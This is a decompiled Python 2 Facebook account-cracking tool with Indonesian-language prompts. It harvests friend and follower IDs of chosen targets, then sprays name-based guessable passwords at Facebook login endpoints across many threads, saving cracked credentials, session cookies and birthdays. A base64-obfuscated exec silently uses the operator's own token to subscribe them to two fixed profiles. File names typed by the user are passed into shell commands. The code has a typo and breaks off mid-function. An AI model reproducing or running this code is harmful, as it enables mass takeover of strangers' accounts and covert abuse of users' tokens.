# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2021-11-08 04:10:42.442196
import os
try:
    import requests
except ImportError:
    print '\n \x1b[0;96m[\x1b[0;93m\xe2\x80\xa2\x1b[0;93m\x1b[0;96m]\x1b[0;96m  \x1b[0;91mModul Requests Kok Belum Di Install :V'
    os.system('pip2 install requests')
try:
    import bs4
except ImportError:
    print '\n \x1b[0;96m[\x1b[0;93m\xe2\x80\xa2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;91mModul Bs4 Kok Belum Di install :V'
    os.system('pip2 install bs4')
try:
    import concurrent.futures
except ImportError:
    print '\n \x1b[0;96m[\x1b[0;93m\xe2\x80\xa2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;91mModul Futures Kok Belum Di Install :V'
    os.system('pip2 install futures')
import os, sys, re, time, requests, calendar, random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
loop = 0
id = []
ok = []
cp = []
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = '%s-%s-%s-%s' % (hr, ha, op, ta)
tgl = '%s %s %s' % (ha, op, ta)
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
def logo():
    os.system('clear')
    ip = requests.get('https://api.ipify.org').text.strip()
    loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
    print '\x1b[1;91m _______  _______  _______  _______ _________          _______'
    print '\x1b[1;91m(  ____ )(  ____ )(  ____ \\(       )\\__   __/|\\     /|(       )'
    print '\x1b[1;91m| (    )|| (    )|| (    \\/| () () |   ) (   | )   ( || () () |'
    print '\x1b[1;91m| (____)|| (____)|| (__    | || || |   | |   | |   | || || || |'
    print '\x1b[1;97m|  _____)|     __)|  __)   | |(_)| |   | |   | |   | || |(_)| |'
    print '\x1b[1;97m| (      | (\\ (   | (      | |   | |   | |   | |   | || |   | |'
    print '\x1b[1;97m| )      | ) \\ \\__| (____/\\| )   ( |___) (___| (___) || )   ( |'
    print '\x1b[1;97m|/       |/   \\__/(_______/|/     \\|\\_______/(_______)|/     \\|'
    print '                          CODE BY JEECK'
    print ' [*] Ip Address : \x1b[1;92m' + ip
    print ' \x1b[0m[*] County Region : \x1b[1;92m' + loc
    print '\x1b[0m'
def login():
    os.system('clear')
    try:
        requests.get('https://www.google.com/search?q=Azim+Vau')
    except requests.exceptions.ConnectionError:
        exit(' \x1b[0;96m[\x1b[0;91mJEECK\x1b[0;91m\x1b[0;96m]\x1b[0;96m Tidak ada koneksi')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        logo()
        print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;96mAnda harus login terlebih dahulu untuk masuk ke menu'
        print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;96mSilakan masukkan token facebook Anda untuk login'
        print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;96mCara ambil token fb nya lu login '
        print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;96mfb di chrome ya pake URL \x1b[0;92mhttps://m.facebook.com'
        print " \x1b[0;96m[\x1b[0;93mFAHAMI\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;96mKetik '\x1b[0;93mhelp\x1b[0;97m' \x1b[0;96muntuk melihat cara mendapatkan token Facebook"
        token = raw_input('\n \x1b[0;96m[\x1b[0;93m\xe2\x80\xa2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;92mMasukan Token Fb Anda \x1b[0;94m--=> ')
        if token == '':
            exit('\n \x1b[0;96m[\x1b[0;93m\xe2\x80\xa2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;91mJangan Kosong Ngab:V')
        else:
            if token == 'help':
                os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed&_rdc=2&_rdr#_=_')
                exit(' \x1b[0;96m[\x1b[0;93m\xe2\x80\xa2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;95mTuh Tumtor Cook Biar Tau Cara Ambil Token :V')
            try:
                nama = requests.get('https://graph.facebook.com/me?access_token=' + token).json()['name'].lower()
                import base64
                exec base64.b64decode('cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDQ1MjAzODU1Mjk0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDMwMTE5MzgwNzIvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCg==')
                open('login.txt', 'w').write(token)
                print '\n [+] Pengguna aktif, selamat datang  \x1b[0;93m%s\x1b[0;97m' % nama
                time.sleep(1)
                menu()
            except KeyError:
                os.system('rm -f login.txt')
                exit('  \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;91mToken Kadaluarsa Ngab:V')
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except KeyError:
        os.system('rm -f login.txt')
        exit(' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;91mToken Kadaluarsa Ngab:V')
    try:
        nama = requests.get('https://graph.facebook.com/me/?access_token=' + token).json()['name']
    except IOError:
        os.system('rm -f login.txt')
        exit(' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;91mToken Kadaluarsa Ngab:V')
    except requests.exceptions.ConnectionError:
        exit(' \x1b[0;96m[\x1b[0;91mJEECK\x1b[0;91m\x1b[0;96m]\x1b[0;96m Tidak ada koneksi')
    logo()
    print ' [ Welcome \x1b[0;93m%s\x1b[0;97m ]\n' % nama
    print '  \x1b[0;96m[\x1b[0;93m1\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mCrack Dari Id Public Teman'
    print '  \x1b[0;96m[\x1b[0;93m2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mCrack Dari Id Public Followers'
    print '  \x1b[0;96m[\x1b[0;93m3\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mCrack Dari Multi Target '
    print '  \x1b[0;96m[\x1b[0;93m4\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mLihat Hasil Crack Anda'
    print '  \x1b[0;96m[\x1b[0;93m5\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mLihat Opsi Hasil Cp'
    print '  \x1b[0;96m[\x1b[0;93m6\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mSeting2 User-Agent'
    print '  \x1b[0;37m[\x1b[0;91m0\x1b[0;97m] \x1b[0;37mexit ( Hapus Token FB)'
    azim = raw_input('\n  \x1b[0;96m[\x1b[0;93m\xe2\x80\xa2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;34mPilih \x1b[0;33m--=> ')
    if azim == '':
        menu()
    elif azim == '1':
        publik()
        method()
    elif azim == '2':
        follower()
        method()
    elif azim == '3':
        massal()
        method()
    elif azim == '4':
        print '\n \x1b[0;96m[\x1b[0;93m1\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;32mLihat Hasil OK'
        print ' \x1b[0;96m[\x1b[0;93m2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;33mLihat Hasil CP'
        cek = raw_input('\n \x1b[0;96m[\x1b[0;93m\xe2\x80\xa2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;34mPilih \x1b[0;33m--=>')
        if cek == '':
            menu()
        elif cek == '1':
            dirs = os.listdir('OK')
            print ' [*] daftar nama file yang disimpan di folder OK\n'
            for file in dirs:
                print ' [+] ' + file
            try:
                file = raw_input('\n [?] Pilih Nama File --=> ')
                if file == '':
                    menu()
                totalok = open('OK/%s' % file).read().splitlines()
            except IOError:
                exit(' \x1b[0;96m[\x1b[0;91mJEECK\x1b[0;91m\x1b[0;96m]\x1b[0;96m File %s Tidak Tersedia' % file)
            nm_file = ('%s' % file).replace('-', ' ')
            del_txt = nm_file.replace('.txt', '')
            print ' [#] ----------------------------------------------'
            print ' [+] crack result : %s total : %s\x1b[0;92m' % (del_txt, len(totalok))
            os.system('cat OK/%s' % file)
            print '\x1b[0;97m [#] ----------------------------------------------'
            exit(' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mjangan lupa copy dan simpan hasilnya')
        elif cek == '2':
            dirs = os.listdir('CP')
            print ' [*] daftar nama file yang tersimpan di folder CP\n'
            for file in dirs:
                print ' [+] ' + file
            try:
                file = raw_input('\n [?] Pilih Nama File --=> ')
                if file == '':
                    menu()
                totalcp = open('CP/%s' % file).read().splitlines()
            except IOError:
                exit(' \x1b[0;96m[\x1b[0;91mJEECK\x1b[0;91m\x1b[0;96m]\x1b[0;96m File %s Tidak Tersedia' % file)
            nm_file = ('%s' % file).replace('-', ' ')
            del_txt = nm_file.replace('.txt', '')
            print ' [#] ----------------------------------------------'
            print ' [+] crack result : %s total : %s\x1b[0;93m' % (del_txt, len(totalcp))
            os.system('cat CP/%s' % file)
            print '\x1b[0;97m [#] ----------------------------------------------'
            exit(' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mjangan lupa copy dan simpan hasilnya')
        else:
            menu()
    elif azim == '5':
        cek_opsi()
    elif azim == '6':
        setting_ua()
    elif azim == '0':
        os.system('rm -f login.txt')
        exit('\n [JEEECK :(] Ya allah kok malah di hapus Token nya hemmm :(')
    else:
        menu()
def publik():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        exit(' \x1b[0;96m[\x1b[0;91mJEECK\x1b[0;91m\x1b[0;96m]\x1b[0;96m Token Kadaluarsa')
    print "\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m  \x1b[0;37mketik \x1b[1;92m'me' \x1b[0;37mjika Anda mau dari pengikut sendiri"
    idt = raw_input(' [+] Masukan Id Target --=> ')
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
            uid = i['id']
            nama = i['name'].rsplit(' ')[0]
            id.append(uid + '<=>' + nama)
    except KeyError:
        exit(' [!] akun tidak tersedia atau daftar teman pribadi')
    print ' [+] total id  : \x1b[0;91m%s\x1b[0;97m' % len(id)
def follower():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        exit(' \x1b[0;96m[\x1b[0;91mJEECK\x1b[0;91m\x1b[0;96m]\x1b[0;96m Token Kadaluarsa')
    print "\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m  \x1b[0;37mketik \x1b[1;92m'me' \x1b[0;37mjika Anda mau dari pengikut sendiri"
    idt = raw_input(' [+] target id : ')
    try:
        for i in requests.get('https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s' % (idt, token)).json()['data']:
            uid = i['id']
            nama = i['name'].rsplit(' ')[0]
            id.append(uid + '<=>' + nama)
    except KeyError:
        exit(' [!] akun tidak tersedia atau daftar teman pribadi')
    print ' [+] total id  : \x1b[0;91m%s\x1b[0;97m' % len(id)
def massal():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        exit(' \x1b[0;96m[\x1b[0;91mJEECK\x1b[0;91m\x1b[0;96m]\x1b[0;96m Token Kadaluarsa')
    try:
        tanya_total = int(raw_input(' [+] number of target id : '))
    except:
        tanya_total = 1
    print "\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m  \x1b[0;37mketik \x1b[1;92m'me' \x1b[0;37mjika Anda mau dari pengikut sendiri"
    for t in range(tanya_total):
        t += 1
        idt = raw_input(' [+] target id %s : ' % t)
        try:
            for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
                uid = i['id']
                nama = i['name'].rsplit(' ')[0]
                id.append(uid + '<=>' + nama)
        except KeyError:
            print ' [!] akun tidak tersedia atau daftar teman pribadi'
    print ' [+] total id  : \x1b[0;91m%s\x1b[0;97m' % len(id)
def method():
    print ' \n [ PILIH METHODE CRACK NGAB:V]\n'
    print ' \x1b[0;96m[\x1b[0;93m1\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mapi method\x1b[0;94m \x1b[0;97m(\x1b[0;97m\x1b[0;93m fast crack +\x1b[0;93m \x1b[0;92mRecomended \x1b[0;97m)\x1b[0;97m'
    print ' \x1b[0;96m[\x1b[0;93m2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mfree method\x1b[0;94m \x1b[0;97m(\x1b[0;97m\x1b[0;93mfast crack + Hasil Mayan\x1b[0;97m)\x1b[0;97m'
    print ' \x1b[0;96m[\x1b[0;93m3\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mMbasic method\x1b[0;94m \x1b[0;97m(\x1b[0;97m\x1b[0;93mSelow Crack + Hasil Banyak  \x1b[0;97m)\x1b[0;97m'
    print ' \x1b[0;96m[\x1b[0;93m4\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mMobile method\x1b[0;94m \x1b[0;97m(\x1b[0;97m\x1b[0;93mSuper Selow + hasil lebih banyak +\x1b[0;93m \x1b[0;92mRecomended\x1b[0;97m)'
    method = raw_input('\n \x1b[0;96m[\x1b[0;93m\xe2\x80\xa2\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mPilih \x1b[0;93m--=> ')
    if method == '':
        menu()
    elif method == '1':
        ask = raw_input(' [?] \x1b[0;37mMenggunakan Katasandi Manual ? \x1b[0;96m[\x1b[0;93my/n\x1b[0;93m\x1b[0;96m]\x1b[0;96m --=> ')
        if ask == 'y':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n [*] Contoh Pass --=> 102030,556677,786786'
                asu = raw_input(' [?] Setel Pass --=> ').split(',')
                if len(asu) == '':
                    exit(' [!] Jangan Kosong')
                print '\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil OK Disimpan Di --=> \x1b[1;92mOK/%s.txt' % tanggal
                print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil CP Disimpan Di --=> \x1b[1;93mCP/%s.txt\n' % tanggal
                print ' \x1b[1;31m[!]\x1b[1;31m \x1b[0;37mjika tidak ada hasil, aktifkan mode pesawat 5 detik\n\x1b[1;37m'
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(api, uid, asu)
            exit('\n\n [#] Oke Nice Ngab:V Sudah Selesai')
        elif ask == 'n':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil OK Disimpan Di --=> \x1b[1;92mOK/%s.txt' % tanggal
                print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil CP Disimpan Di --=> \x1b[1;93mCP/%s.txt\n' % tanggal
                print ' \x1b[1;31m[!]\x1b[1;31m \x1b[0;37mjika tidak ada hasil, aktifkan mode pesawat 5 detik\n\x1b[1;37m'
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    else:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    coeg.submit(api, uid, pwx)
            exit('\n\n [#] Oke Nice Ngab:V Sudah Selesai')
    elif method == '2':
        ask = raw_input(' [?] \x1b[0;37mMenggunakan Katasandi Manual ? \x1b[0;96m[\x1b[0;93my/n\x1b[0;93m\x1b[0;96m]\x1b[0;96m --=> ')
        if ask == 'y':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n [*] Contoh Pass --=> 102030, 556677, 786786'
                asu = raw_input(' [?] Setel Pass --=> ').split(',')
                if len(asu) == '':
                    exit(' [!] Jangan Kosong')
                print '\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil OK Disimpan Di --=> \x1b[1;92mOK/%s.txt' % tanggal
                print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil CP Disimpan Di --=> \x1b[1;93mCP/%s.txt\n' % tanggal
                print ' \x1b[1;31m[!]\x1b[1;31m \x1b[0;37mjika tidak ada hasil, aktifkan mode pesawat 5 detik\n\x1b[1;37m'
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu, 'https:/free.facebook.com')
            exit('\n\n [#] Oke Nice Ngab:V Sudah Selesai')
        elif ask == 'n':
            with ThreadPoolExecutor(max_workers=35) as (coeg):
                print '\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil OK Disimpan Di --=> \x1b[1;92mOK/%s.txt' % tanggal
                print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil CP Disimpan Di --=> \x1b[1;93mCP/%s.txt\n' % tanggal
                print ' \x1b[1;31m[!]\x1b[1;31m \x1b[0;37mjika tidak ada hasil, aktifkan mode pesawat 5 detik\n\x1b[1;37m'
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    else:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    coeg.submit(crack, uid, pwx, 'https://free.facebook.com')
            exit('\n\n \x1b[1;31m[!]\x1b[1;31m \x1b[0;37mjika tidak ada hasil, aktifkan mode pesawat 5 detik\n\x1b[1;37m')
    elif method == '3':
        ask = raw_input(' [?] \x1b[0;37mMenggunakan Katasandi Manual ? \x1b[0;96m[\x1b[0;93my/n\x1b[0;93m\x1b[0;96m]\x1b[0;96m --=> ')
        if ask == 'y':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n [*] Contoh Pass --=> 102030, 556677, 786786'
                asu = raw_input(' [?] Setel Pass --=> ').split(',')
                if len(asu) == '':
                    exit(' [!] Jangan Kosong')
                print '\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil OK Disimpan Di --=> \x1b[1;92mOK/%s.txt' % tanggal
                print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil CP Disimpan Di --=> \x1b[1;93mCP/%s.txt\n' % tanggal
                print ' [!] \x1b[1;31m[!]\x1b[1;31m \x1b[1;37mjika tidak ada hasil, aktifkan mode pesawat 5 detik\n\x1b[1;37m'
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu, 'https://mbasic.facebook.com')
            exit('\n\n [#] Oke Nice Ngab:V Sudah Selesai')
        elif ask == 'n':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil OK Disimpan Di --=> \x1b[1;92mOK/%s.txt' % tanggal
                print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil CP Disimpan Di --=> \x1b[1;93mCP/%s.txt\n' % tanggal
                print ' \x1b[1;31m[!]\x1b[1;31m \x1b[0;37mjika tidak ada hasil, aktifkan mode pesawat 5 detik\n\x1b[1;37m'
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    else:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    coeg.submit(crack, uid, pwx, 'https://mbasic.facebook.com')
            exit('\n\n [#] Oke Nice Ngab:V Sudah Selesai')
    elif method == '4':
        ask = raw_input(' [?] \x1b[0;37mMenggunakan Katasandi Manual ? \x1b[0;96m[\x1b[0;93my/n\x1b[0;93m\x1b[0;96m]\x1b[0;96m --=> ')
        if ask == 'y':
            with hreadPoolExecutor(max_workers=30) as (coeg):
                print '\n [*] Contoh Pass --=> 102030, 556677, 786786'
                asu = raw_input(' [?] Setel Pass --=> ').split(',')
                if len(asu) == '':
                    exit(' [!] Jangan Kosong')
                print '\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil OK Disimpan Di --=> \x1b[1;92mOK/%s.txt' % tanggal
                print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil CP Disimpan Di --=> \x1b[1;93mCP/%s.txt\n' % tanggal
                print ' \x1b[1;31m[!]\x1b[1;31m \x1b[0;37mjika tidak ada hasil, aktifkan mode pesawat 5 detik\n\x1b[1;37m'
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu, 'https://m.facebook.com')
            exit('\n\n [#] Oke Nice Ngab:V Sudah Selesai')
        elif ask == 'n':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil OK Disimpan Di --=> \x1b[1;92mOK/%s.txt' % tanggal
                print ' \x1b[0;96m[\x1b[0;93mJEECK\x1b[0;93m\x1b[0;96m]\x1b[0;96m \x1b[0;37mHasil CP Disimpan Di --=> \x1b[1;93mCP/%s.txt\n' % tanggal
                print ' \x1b[1;31m[!]\x1b[1;31m \x1b[0;37mjika tidak ada hasil, aktifkan mode pesawat 5 detik\n\x1b[1;37m'
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    else:
                        pwx = [
                         name + '123', name + '1234', name + '12345']
                    coeg.submit(crack, uid, pwx, 'https://m.facebook.com')
            exit('\n\n [#] Oke Nice Ngab:V Sudah Selesai')
        else:
            exit('\n [!] Konten Yang Benar Pantekk')
    else:
        menu()
def api(uid, pwx):
    global cp
    global loop
    global ok
    global token
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
    sys.stdout.write('\r \x1b[0;37m[*] Crack Berjalan %s/%s ok:-%s - cp:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwx:
        pw = pw.lower()
        ses = requests.Session()
        headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
        send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
        if 'session_key' in send.text and 'EAAA' in send.text:
            print '\r  \x1b[0;92mSETOR--=> %s|%s|%s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s|%s' % (uid, pw))
            open('OK/%s.txt' % tanggal, 'a').write('  SETOR--=> %s|%s\n' % (uid, pw))
            break
        elif 'www.facebook.com' in send.json()['error_msg']:
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  \x1b[0;93mSETOR--=> %s|%s|%s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s|%s' % (uid, pw))
                    open('CP/%s.txt' % tanggal, 'a').write('  SETOR--=> %s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass
            print '\r  \x1b[0;93mSETOR--=> %s|%s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s|%s' % (uid, pw))
            open('CP/%s.txt' % tanggal, 'a').write('  SETOR--=> %s|%s\n' % (uid, pw))
            break
        else:
            continue
    loop += 1
def crack(uid, pwx, host, **kwargs):
    global loop
    global token
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
    sys.stdout.write('\r \x1b[1;97m[*] Crack Berjalan %s/%s ok:-%s - cp:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    try:
        for pw in pwx:
            kwargs = {}
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'origin': host, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', host)), 'referer': host + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
            p = ses.get(host + '/login/?next&ref=dbl&refid=8').text
            b = parser(p, 'html.parser')
            bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:
                        continue
                except:
                    pass
            kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
            gaaa = ses.post(host + '/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=kwargs)
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  \x1b[0;92mSETOR--=> %s|%s|%s\x1b[0;97m' % (uid, pw, kuki)
                ok.append('%s|%s' % (uid, pw))
                open('OK/%s.txt' % tanggal, 'a').write(' SETOR--=> %s|%s\n' % (uid, pw))
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    token = open('login.txt', 'r').read()
                    with requests.Session() as (ses):
                        ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                        month, day, year = ttl.split('/')
                        month = bulan_ttl[month]
                        print '\r  \x1b[0;93mSETOR--=> %s|%s|%s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                        cp.append('%s|%s' % (uid, pw))
                        open('CP/%s.txt' % tanggal, 'a').write('  SETOR--=> %s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                        break
                except (KeyError, IOError):
                    day = ' '
                    month = ' '
                    year = ' '
                except:
                    pass
                print '\r  \x1b[0;93mSETOR--=> %s|%s\x1b[0;97m        ' % (uid, pw)
                cp.append('%s|%s' % (uid, pw))
                open('CP/%s.txt' % tanggal, 'a').write('  SETOR--=> %s|%s\n' % (uid, pw))
                break
            else:
                continue
        loop += 1
    except Exception as e:
